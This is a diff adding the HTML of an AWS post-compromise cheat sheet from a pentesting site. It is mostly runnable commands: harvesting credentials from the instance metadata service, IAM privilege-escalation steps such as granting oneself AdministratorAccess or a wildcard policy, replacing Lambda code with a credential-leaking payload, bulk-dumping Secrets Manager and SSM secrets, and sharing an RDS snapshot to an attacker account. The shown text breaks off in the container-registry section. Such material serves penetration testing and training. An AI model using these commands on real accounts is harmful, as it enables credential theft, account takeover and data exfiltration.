@@ -1,0 +1,629 @@
+<!DOCTYPE html>
+<html lang="en-US" dir="ltr" class="">
+<head>
+  <meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>AWS | JinPwn</title><meta name="description" content="AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.">
+<meta name="robots" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+<meta name="googlebot" content="index,follow,max-image-preview:large,max-snippet:-1,max-video-preview:-1">
+
+<link rel="canonical" href="https://jinpwn.dev/cheatsheets/cloud/aws/">
+<meta property="og:title" content="AWS | JinPwn">
+<meta property="og:description" content="AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.">
+<meta property="og:type" content="website">
+<meta property="og:url" content="https://jinpwn.dev/cheatsheets/cloud/aws/">
+<meta property="og:site_name" content="JinPwn">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:title" content="AWS | JinPwn">
+<meta name="twitter:description" content="AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.">
+<meta name="twitter:image" content="https://jinpwn.dev/images/og/og.png">
+<meta name="twitter:site" content="@jinpwn">
+<meta name="twitter:creator" content="@jinpwn">
+
+
+<script type="application/ld+json">{"@context":"https://schema.org","@type":"WebPage","description":"AWS attack surface. Storage in Cloud Storage , external recon in Cloud Recon . This file covers what to do once you have credentials or are inside an AWS account.","image":["https://jinpwn.dev/images/og/og.png"],"inLanguage":"en-US","name":"AWS | JinPwn","url":"https://jinpwn.dev/cheatsheets/cloud/aws/"}</script>
+
+<meta name="theme-color" content="#111111">
+<link rel="icon" type="image/png" href="/favicon.png">
+
+      <link rel="stylesheet" href="/css/site.min.bbc8db26832d45b71fab2c52bea8e7468ac7f3d71458dff1936b8d5891ff48a8.css" integrity="sha256-u8jbJoMtRbcfqyxSvqjnRorH89cUWN/xk2uNWJH/SKg=" crossorigin="anonymous">
+
+
+        <script src="/js/main.e9594fc927ccbd51f2ef3a698abafb8bbf09dcc796037e0a51eedfb14ca858f4.js" integrity="sha256-6VlPySfMvVHy7zppirr7i78J3MeWA34KUe7fsUyoWPQ=" crossorigin="anonymous" defer></script>
+        <script src="/js/asm-highlight.d74879c0e3b6982d95821f5d83904fa40660a6a7e4a2442cdc4bda545679f540.js" integrity="sha256-10h5wOO2mC2Vgh9dg5BPpAZgpqfkokQs3EvaVFZ59UA=" crossorigin="anonymous" defer></script>
+
+
+</head>
+<body class="">
+  
+
+
+
+
+
+  
+  
+  
+
+
+
+  
+
+<header class="site-header">
+  <nav class="top-nav">
+    <div class="container nav-inner">
+      <div class="nav-left">
+        <a href="/" class="brand-link has-logo" aria-label="Home"><img src="/favicon.png" alt="jinpwn.dev" class="brand-logo" style="--brand-logo-height: 36px;"></a>
+        <div class="nav-links desktop-only">
+          
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+        </div>
+      </div>
+      <div class="nav-actions">
+        <div class="search-anchor" id="search-root" data-search-root>
+          <label class="search-trigger" for="search-input">
+            <span class="search-glyph" aria-hidden="true">
+              <svg viewBox="0 0 24 24">
+                <circle cx="11" cy="11" r="7"></circle>
+                <path d="M20 20L16.65 16.65"></path>
+              </svg>
+            </span>
+            <input id="search-input" type="search" placeholder="Search..." autocomplete="off" spellcheck="false" aria-label="Search posts and cheatsheets">
+            <button type="button" class="search-clear" data-search-clear aria-label="Clear search" hidden>
+              <svg viewBox="0 0 24 24" aria-hidden="true">
+                <path d="M18 6L6 18"></path>
+                <path d="M6 6l12 12"></path>
+              </svg>
+            </button>
+            <span class="search-trigger-shortcut desktop-only" aria-hidden="true">CTRL K</span>
+          </label>
+          <div id="search-dropdown" class="search-dropdown" hidden data-search-index-url="/search-index.json" data-search-runtime-url="/js/search-flex.1b1c225e3d6a2ff08480727a5e3bf93df59715e138fede75b7616d9c75fc4fa7.js">
+  <p class="search-status" data-search-status aria-live="polite">Type to search posts and cheatsheets.</p>
+  <div class="search-results" data-search-results role="listbox" aria-label="Search results">
+    <p class="search-empty">Type to search posts and cheatsheets.</p>
+  </div>
+</div>
+
+        </div>
+        <button class="icon-button mobile-only" type="button" data-search-mobile-toggle aria-label="Search" aria-expanded="false" aria-controls="search-root">
+          <svg viewBox="0 0 24 24" aria-hidden="true">
+            <circle cx="11" cy="11" r="7"></circle>
+            <path d="M20 20L16.65 16.65"></path>
+          </svg>
+        </button>
+        <button class="icon-button mobile-only" type="button" data-mobile-toggle aria-label="Toggle menu" aria-expanded="false" aria-controls="mobile-nav">
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-open-icon>
+            <path d="M3 6h18"></path>
+            <path d="M3 12h18"></path>
+            <path d="M3 18h18"></path>
+          </svg>
+          <svg viewBox="0 0 24 24" aria-hidden="true" data-menu-close-icon hidden>
+            <path d="M18 6L6 18"></path>
+            <path d="M6 6l12 12"></path>
+          </svg>
+        </button>
+      </div>
+    </div>
+    <div id="mobile-nav" class="mobile-nav">
+      
+    <a href="/">Posts</a>
+    <a href="/posts/">Archive</a>
+    <a href="/cheatsheets/" class="is-current">Cheatsheets</a>
+    <a href="/about/">About</a>
+
+    </div>
+  </nav>
+</header>
+
+  
+  <main class="site-main">
+    
+  
+  
+  
+  <article class="container cheatsheet-docs-shell">
+    <div class="cheatsheet-docs-layout">
+      
+        <aside class="cheatsheet-sidebar" aria-label="Cloud Pentesting navigation">
+    <div class="cheatsheet-sidebar-inner">
+      
+        <a href="/cheatsheets/" class="cheatsheet-sidebar-root">All cheatsheets</a>
+      
+      <a href="/cheatsheets/cloud/" class="cheatsheet-sidebar-section">Cloud Pentesting</a>
+      
+        <nav class="cheatsheet-sidebar-nav">
+          <ul class="cheatsheet-sidebar-list">
+            
+              <li>
+                <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-sidebar-link">Cloud MOC</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-sidebar-link">Cloud Recon</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-sidebar-link">Cloud Storage</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/aws/" class="cheatsheet-sidebar-link is-current">AWS</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/azure/" class="cheatsheet-sidebar-link">Azure</a>
+              </li>
+            
+              <li>
+                <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-sidebar-link">GCP</a>
+              </li>
+            
+          </ul>
+        </nav>
+      
+    </div>
+  </aside>
+      
+      <div class="cheatsheet-docs-main cheatsheet-page-main">
+        <header class="cheatsheet-page-header">
+          <h1>AWS</h1>
+          
+        </header>
+
+        
+          <details class="cheatsheet-mobile-sections">
+    <summary class="cheatsheet-mobile-sections-summary">
+      <span class="cheatsheet-mobile-sections-label">Sections</span>
+      <span class="cheatsheet-mobile-sections-current">AWS</span>
+      <span class="cheatsheet-mobile-sections-caret" aria-hidden="true"></span>
+    </summary>
+    <div class="cheatsheet-mobile-sections-panel">
+      <nav aria-label="Cloud Pentesting sections">
+        <ul class="cheatsheet-mobile-sections-list">
+          
+            <li>
+              <a href="/cheatsheets/" class="cheatsheet-mobile-sections-link cheatsheet-mobile-sections-root">All cheatsheets</a>
+            </li>
+          
+          <li>
+            <a href="/cheatsheets/cloud/" class="cheatsheet-mobile-sections-link">Overview</a>
+          </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/00-cloud-moc/" class="cheatsheet-mobile-sections-link">Cloud MOC</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-recon/" class="cheatsheet-mobile-sections-link">Cloud Recon</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/cloud-storage/" class="cheatsheet-mobile-sections-link">Cloud Storage</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/aws/" class="cheatsheet-mobile-sections-link is-current">AWS</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/azure/" class="cheatsheet-mobile-sections-link">Azure</a>
+            </li>
+          
+            <li>
+              <a href="/cheatsheets/cloud/gcp/" class="cheatsheet-mobile-sections-link">GCP</a>
+            </li>
+          
+        </ul>
+      </nav>
+    </div>
+  </details>
+        
+
+        <div class="markdown-content cheatsheet-page-body">
+          <p>AWS attack surface. Storage in <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">Cloud Storage</a>
+, external recon in <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-recon/">Cloud Recon</a>
+. This file covers what to do once you have credentials or are inside an AWS account.</p>
+<h2 id="i-set-up-identity" data-heading-permalink="true"><span class="heading-content">i. Set up identity</span>
+    <a class="heading-permalink" href="#i-set-up-identity" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Found keys (from leaked configs, IMDS, etc):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_ACCESS_KEY_ID</span><span class="o">=</span>AKIA...
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_SECRET_ACCESS_KEY</span><span class="o">=</span>...
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_SESSION_TOKEN</span><span class="o">=</span>...     <span class="c1">## only for ASIA... temp creds</span>
+</span></span><span class="line"><span class="cl"><span class="nb">export</span> <span class="nv">AWS_DEFAULT_REGION</span><span class="o">=</span>us-east-1
+</span></span></code></pre></div><p>Or use a profile:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws configure --profile target
+</span></span><span class="line"><span class="cl"><span class="c1">## Then prefix everything with --profile target</span>
+</span></span></code></pre></div><p>Confirm identity:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws sts get-caller-identity
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns: UserId, Account, Arn</span>
+</span></span></code></pre></div><p>The ARN format tells you what you have:</p>
+<ul>
+<li><code>arn:aws:iam::123456789012:user/alice</code> -&gt; IAM user (<code>AKIA...</code>)</li>
+<li><code>arn:aws:sts::123456789012:assumed-role/role-name/session-name</code> -&gt; STS session</li>
+<li><code>arn:aws:iam::123456789012:root</code> -&gt; root credentials (catastrophic)</li>
+</ul>
+<h2 id="ii-imds-harvest-creds-from-inside" data-heading-permalink="true"><span class="heading-content">ii. IMDS: harvest creds from inside</span>
+    <a class="heading-permalink" href="#ii-imds-harvest-creds-from-inside" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>When you have SSRF or RCE on an EC2 instance, hit the Instance Metadata Service.</p>
+<p><strong>IMDSv1</strong> (legacy, still found in older instances):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns role name, then:</span>
+</span></span><span class="line"><span class="cl">curl http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role-name&gt;
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns: AccessKeyId, SecretAccessKey, Token, Expiration</span>
+</span></span></code></pre></div><p><strong>IMDSv2</strong> (required on new launches since mid-2023):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Get a token first</span>
+</span></span><span class="line"><span class="cl"><span class="nv">TOKEN</span><span class="o">=</span><span class="k">$(</span>curl -X PUT <span class="s2">&#34;http://169.254.169.254/latest/api/token&#34;</span> -H <span class="s2">&#34;X-aws-ec2-metadata-token-ttl-seconds: 21600&#34;</span><span class="k">)</span>
+</span></span><span class="line"><span class="cl"><span class="c1">## Then use it on every metadata call</span>
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;X-aws-ec2-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/
+</span></span><span class="line"><span class="cl">curl -H <span class="s2">&#34;X-aws-ec2-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> http://169.254.169.254/latest/meta-data/iam/security-credentials/&lt;role&gt;
+</span></span></code></pre></div><p>For SSRF that can&rsquo;t send PUT or arbitrary headers, IMDSv2 blocks you. Some SSRFs allow header injection via CRLF or HTTP/1.1 abuse.</p>
+<p>User data (init script with potential secrets):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl -H <span class="s2">&#34;X-aws-ec2-metadata-token: </span><span class="nv">$TOKEN</span><span class="s2">&#34;</span> http://169.254.169.254/latest/user-data
+</span></span></code></pre></div><h2 id="iii-initial-enumeration" data-heading-permalink="true"><span class="heading-content">iii. Initial enumeration</span>
+    <a class="heading-permalink" href="#iii-initial-enumeration" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>What does my identity have?</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws sts get-caller-identity
+</span></span><span class="line"><span class="cl">aws iam get-user                          <span class="c1">## works only if you have iam:GetUser</span>
+</span></span><span class="line"><span class="cl">aws iam list-attached-user-policies --user-name &lt;yours&gt;
+</span></span><span class="line"><span class="cl">aws iam list-groups-for-user --user-name &lt;yours&gt;
+</span></span><span class="line"><span class="cl">aws iam list-user-policies --user-name &lt;yours&gt;
+</span></span></code></pre></div><p>For an assumed role, look at the role policy:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam get-role --role-name &lt;role&gt;
+</span></span><span class="line"><span class="cl">aws iam list-attached-role-policies --role-name &lt;role&gt;
+</span></span></code></pre></div><p>Account-wide enumeration (if you have permissions):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam list-users
+</span></span><span class="line"><span class="cl">aws iam list-roles
+</span></span><span class="line"><span class="cl">aws iam list-groups
+</span></span><span class="line"><span class="cl">aws iam list-policies --scope Local
+</span></span><span class="line"><span class="cl">aws s3 ls
+</span></span><span class="line"><span class="cl">aws ec2 describe-instances --query <span class="s1">&#39;Reservations[].Instances[].[InstanceId,PublicIpAddress,PrivateIpAddress,State.Name]&#39;</span> --output table
+</span></span><span class="line"><span class="cl">aws lambda list-functions
+</span></span><span class="line"><span class="cl">aws rds describe-db-instances
+</span></span><span class="line"><span class="cl">aws ecr describe-repositories
+</span></span><span class="line"><span class="cl">aws eks list-clusters
+</span></span><span class="line"><span class="cl">aws sso list-instances                    <span class="c1">## for AWS IAM Identity Center</span>
+</span></span></code></pre></div><h2 id="iv-pacu-the-aws-exploitation-framework" data-heading-permalink="true"><span class="heading-content">iv. Pacu, the AWS exploitation framework</span>
+    <a class="heading-permalink" href="#iv-pacu-the-aws-exploitation-framework" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">pacu
+</span></span><span class="line"><span class="cl"><span class="c1">## Inside Pacu:</span>
+</span></span><span class="line"><span class="cl">import_keys profile_name
+</span></span><span class="line"><span class="cl">run iam__enum_permissions                 <span class="c1">## enumerate what you can do</span>
+</span></span><span class="line"><span class="cl">run iam__enum_users_roles_policies_groups
+</span></span><span class="line"><span class="cl">run iam__privesc_scan                     <span class="c1">## checks for known privesc paths</span>
+</span></span><span class="line"><span class="cl">run ec2__enum
+</span></span><span class="line"><span class="cl">run s3__enum
+</span></span><span class="line"><span class="cl">run lambda__enum
+</span></span><span class="line"><span class="cl">run rds__enum_snapshots
+</span></span></code></pre></div><p>Pacu&rsquo;s <code>iam__privesc_scan</code> is the headline feature - automated check for 21+ known privesc paths.</p>
+<h2 id="v-scoutsuite-and-prowler-audit-tools" data-heading-permalink="true"><span class="heading-content">v. ScoutSuite and Prowler (audit tools)</span>
+    <a class="heading-permalink" href="#v-scoutsuite-and-prowler-audit-tools" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>ScoutSuite (multi-cloud, generates HTML report):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">scout aws --profile target
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: scoutsuite-report/aws-target.html</span>
+</span></span></code></pre></div><p>Prowler (CIS/NIST benchmarks + finding triage):</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">prowler aws -p target -M html
+</span></span><span class="line"><span class="cl"><span class="c1">## Output: output/*.html</span>
+</span></span></code></pre></div><p>Both are LOUD (many describe calls). On a real engagement, expect detection. On a lab/CTF, fire away.</p>
+<h2 id="vi-common-iam-privesc-paths" data-heading-permalink="true"><span class="heading-content">vi. Common IAM privesc paths</span>
+    <a class="heading-permalink" href="#vi-common-iam-privesc-paths" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<p>Pacu detects 21+ paths automatically. The big ones to know:</p>
+<h3 id="direct-policy-attachment" data-heading-permalink="true"><span class="heading-content">Direct policy attachment</span>
+    <a class="heading-permalink" href="#direct-policy-attachment" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:AttachUserPolicy</code> -&gt; attach <code>AdministratorAccess</code> to yourself</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam attach-user-policy --user-name &lt;yours&gt; --policy-arn arn:aws:iam::aws:policy/AdministratorAccess
+</span></span></code></pre></div><h3 id="create-new-access-key" data-heading-permalink="true"><span class="heading-content">Create new access key</span>
+    <a class="heading-permalink" href="#create-new-access-key" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:CreateAccessKey</code> -&gt; create keys for another user (often admin) you have rights on</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam create-access-key --user-name admin_user
+</span></span></code></pre></div><h3 id="update-assume-role-policy" data-heading-permalink="true"><span class="heading-content">Update assume role policy</span>
+    <a class="heading-permalink" href="#update-assume-role-policy" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:UpdateAssumeRolePolicy</code> -&gt; change who can assume a privileged role -&gt; add yourself</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam update-assume-role-policy --role-name admin_role --policy-document file://trust.json
+</span></span><span class="line"><span class="cl"><span class="c1">## trust.json grants Principal=YOUR_USER_ARN sts:AssumeRole</span>
+</span></span><span class="line"><span class="cl">aws sts assume-role --role-arn arn:aws:iam::ACCT:role/admin_role --role-session-name pwn
+</span></span></code></pre></div><h3 id="iampassrole--service-that-invokes" data-heading-permalink="true"><span class="heading-content">iam:PassRole + service that invokes</span>
+    <a class="heading-permalink" href="#iampassrole--service-that-invokes" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:PassRole</code> + <code>lambda:CreateFunction</code> -&gt; Lambda runs as the role</li>
+<li><code>iam:PassRole</code> + <code>ec2:RunInstances</code> -&gt; EC2 runs as the role (then hit IMDS)</li>
+<li><code>iam:PassRole</code> + <code>glue:CreateJob</code> / <code>glue:UpdateJob</code> -&gt; Glue job runs as the role</li>
+<li><code>iam:PassRole</code> + <code>cloudformation:CreateStack</code> -&gt; Stack runs as the role</li>
+<li><code>iam:PassRole</code> + <code>datapipeline:CreatePipeline</code> -&gt; Pipeline runs as the role</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Example: PassRole + Lambda to assume an admin role</span>
+</span></span><span class="line"><span class="cl">aws lambda create-function <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --function-name pwn <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --runtime python3.11 <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --role arn:aws:iam::ACCT:role/admin_role <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --handler index.handler <span class="se">\
+</span></span></span><span class="line"><span class="cl">  --zip-file fileb://function.zip
+</span></span><span class="line"><span class="cl"><span class="c1">## function.zip contains code that prints env vars (the role&#39;s creds)</span>
+</span></span><span class="line"><span class="cl">aws lambda invoke --function-name pwn /tmp/out.json
+</span></span></code></pre></div><h3 id="policy-version-switching" data-heading-permalink="true"><span class="heading-content">Policy version switching</span>
+    <a class="heading-permalink" href="#policy-version-switching" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:SetDefaultPolicyVersion</code> -&gt; revert a policy to an older version that gives you more</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam list-policy-versions --policy-arn arn:aws:iam::ACCT:policy/X
+</span></span><span class="line"><span class="cl">aws iam set-default-policy-version --policy-arn arn:aws:iam::ACCT:policy/X --version-id v1
+</span></span></code></pre></div><h3 id="inline-policy-injection" data-heading-permalink="true"><span class="heading-content">Inline policy injection</span>
+    <a class="heading-permalink" href="#inline-policy-injection" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>iam:PutUserPolicy</code> / <code>iam:PutGroupPolicy</code> / <code>iam:PutRolePolicy</code> -&gt; grant yourself anything</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws iam put-user-policy --user-name &lt;yours&gt; --policy-name pwn --policy-document <span class="s1">&#39;{&#34;Version&#34;:&#34;2012-10-17&#34;,&#34;Statement&#34;:[{&#34;Effect&#34;:&#34;Allow&#34;,&#34;Action&#34;:&#34;*&#34;,&#34;Resource&#34;:&#34;*&#34;}]}&#39;</span>
+</span></span></code></pre></div><h3 id="cross-account-assume-role" data-heading-permalink="true"><span class="heading-content">Cross-account assume role</span>
+    <a class="heading-permalink" href="#cross-account-assume-role" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<p>You have IAM in account A, can assume a role in account B because B&rsquo;s trust policy allows it:</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws sts assume-role --role-arn arn:aws:iam::OTHER_ACCT:role/cross_account --role-session-name pwn
+</span></span><span class="line"><span class="cl"><span class="c1">## Returns new ASIA... creds. Switch identity to those.</span>
+</span></span></code></pre></div><h2 id="vii-service-specific-abuse" data-heading-permalink="true"><span class="heading-content">vii. Service-specific abuse</span>
+    <a class="heading-permalink" href="#vii-service-specific-abuse" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h2>
+<h3 id="s3" data-heading-permalink="true"><span class="heading-content">S3</span>
+    <a class="heading-permalink" href="#s3" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Bucket policies with <code>Principal: *</code> allow Sigv4 from any account</li>
+<li>Bucket replication can be configured to mirror objects to attacker-controlled bucket</li>
+<li>See <a href="https://jinpwn.dev/cheatsheets/cloud/cloud-storage/">Cloud Storage</a>
+ for details</li>
+</ul>
+<h3 id="lambda" data-heading-permalink="true"><span class="heading-content">Lambda</span>
+    <a class="heading-permalink" href="#lambda" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Read function code:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws lambda get-function --function-name X --query <span class="s1">&#39;Code.Location&#39;</span> --output text <span class="p">|</span> xargs curl -o code.zip
+</span></span><span class="line"><span class="cl">unzip code.zip <span class="o">&amp;&amp;</span> grep -RE <span class="s1">&#39;aws_secret|api_key|password&#39;</span> .
+</span></span></code></pre></div><ul>
+<li>Read environment variables (often contain secrets):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws lambda get-function-configuration --function-name X --query <span class="s1">&#39;Environment.Variables&#39;</span>
+</span></span></code></pre></div><ul>
+<li>Modify function to leak its execution role creds:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1">## Replace handler code with one that prints AWS_ACCESS_KEY_ID env</span>
+</span></span><span class="line"><span class="cl">aws lambda update-function-code --function-name X --zip-file fileb://malicious.zip
+</span></span><span class="line"><span class="cl">aws lambda invoke --function-name X /tmp/out.json
+</span></span></code></pre></div><h3 id="ec2" data-heading-permalink="true"><span class="heading-content">EC2</span>
+    <a class="heading-permalink" href="#ec2" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li><code>ec2:RunInstances</code> with <code>iam:PassRole</code> -&gt; spawn instance with admin role</li>
+<li><code>ec2:GetPasswordData</code> -&gt; get Windows admin password (RSA-encrypted with the keypair)</li>
+<li>Snapshot abuse: <code>ec2:CreateSnapshot</code> on a privileged instance&rsquo;s volume, mount in your instance, read /etc/shadow or admin tokens</li>
+<li>User data scripts often have hardcoded creds:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws ec2 describe-instance-attribute --instance-id i-abc --attribute userData --query <span class="s1">&#39;UserData.Value&#39;</span> --output text <span class="p">|</span> base64 -d
+</span></span></code></pre></div><h3 id="rds" data-heading-permalink="true"><span class="heading-content">RDS</span>
+    <a class="heading-permalink" href="#rds" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Snapshot the DB, share with attacker account, restore there:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws rds create-db-snapshot --db-snapshot-identifier sn --db-instance-identifier prod
+</span></span><span class="line"><span class="cl">aws rds modify-db-snapshot-attribute --db-snapshot-identifier sn --attribute-name restore --values-to-add YOUR_ACCT
+</span></span></code></pre></div><ul>
+<li>Database master password reset (if you have <code>rds:ModifyDBInstance</code>):</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws rds modify-db-instance --db-instance-identifier prod --master-user-password <span class="s1">&#39;NewP@ss!&#39;</span> --apply-immediately
+</span></span></code></pre></div><h3 id="secrets-manager-and-ssm-parameter-store" data-heading-permalink="true"><span class="heading-content">Secrets Manager and SSM Parameter Store</span>
+    <a class="heading-permalink" href="#secrets-manager-and-ssm-parameter-store" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Grab everything:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws secretsmanager list-secrets --query <span class="s1">&#39;SecretList[].Name&#39;</span>
+</span></span><span class="line"><span class="cl"><span class="k">for</span> s in <span class="k">$(</span>aws secretsmanager list-secrets --query <span class="s1">&#39;SecretList[].Name&#39;</span> --output text<span class="k">)</span><span class="p">;</span> <span class="k">do</span>
+</span></span><span class="line"><span class="cl">  <span class="nb">echo</span> <span class="s2">&#34;=== </span><span class="nv">$s</span><span class="s2"> ===&#34;</span>
+</span></span><span class="line"><span class="cl">  aws secretsmanager get-secret-value --secret-id <span class="s2">&#34;</span><span class="nv">$s</span><span class="s2">&#34;</span> --query <span class="s1">&#39;SecretString&#39;</span> --output text
+</span></span><span class="line"><span class="cl"><span class="k">done</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1">## SSM Parameter Store (often forgotten):</span>
+</span></span><span class="line"><span class="cl">aws ssm describe-parameters --query <span class="s1">&#39;Parameters[].Name&#39;</span>
+</span></span><span class="line"><span class="cl">aws ssm get-parameters-by-path --path / --recursive --with-decryption
+</span></span></code></pre></div><h3 id="ecr-container-registry" data-heading-permalink="true"><span class="heading-content">ECR (container registry)</span>
+    <a class="heading-permalink" href="#ecr-container-registry" aria-label="Link to this section">
+      <span aria-hidden="true">#</span>
+    </a></h3>
+<ul>
+<li>Pull every image, scan for secrets in layers:</li>
+</ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">aws ecr describe-repositories --query <span class="s1">&#39;repositories[].repositoryName&#39;</span>
+</span></span><span class="line"><span class="cl">aws ecr get-login-password <span class="p">|</span> docker login --username AWS --password-stdin &lt;acct&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com
+</span></span><span class="line"><span class="cl">docker pull &lt;acct&gt;.dkr.ecr.&lt;region&gt;.amazonaws.com/&lt;repo&gt;:latest
+</span></span><span class="line"><span class="cl">docker save &lt;image&gt; -o image.tar
